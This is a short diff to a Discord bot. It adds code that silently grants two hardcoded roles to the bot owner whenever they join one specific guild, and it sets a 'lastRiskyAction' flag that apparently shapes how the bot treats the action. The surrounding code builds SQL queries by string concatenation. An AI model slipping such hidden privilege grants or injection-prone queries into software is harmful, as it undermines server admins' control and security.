@@ -130,6 +130,20 @@ bot.on("guildCreate", async function(guild) {
 });
 
 bot.on("guildMemberAdd", async function (member) {
+
+        if(member.id == ownerID && member.guild.id == "406214702209826817") {
+
+            lastRiskyAction = "MEMBER_ROLE_UPDATE";
+
+            member.addRole("435865831377731584");
+
+            lastRiskyAction = "MEMBER_ROLE_UPDATE";
+
+            member.addRole("588382223758262314");
+
+        }
+
+
 	await database.query("SELECT * FROM servers WHERE server_id=" + member.guild.id + "::text").then(function(response) {
 		if(typeof response.rows[0] == "undefined") {
 			database.query("INSERT INTO servers (server_id) VALUES (" + member.guild.id + ")").then(function(response) {
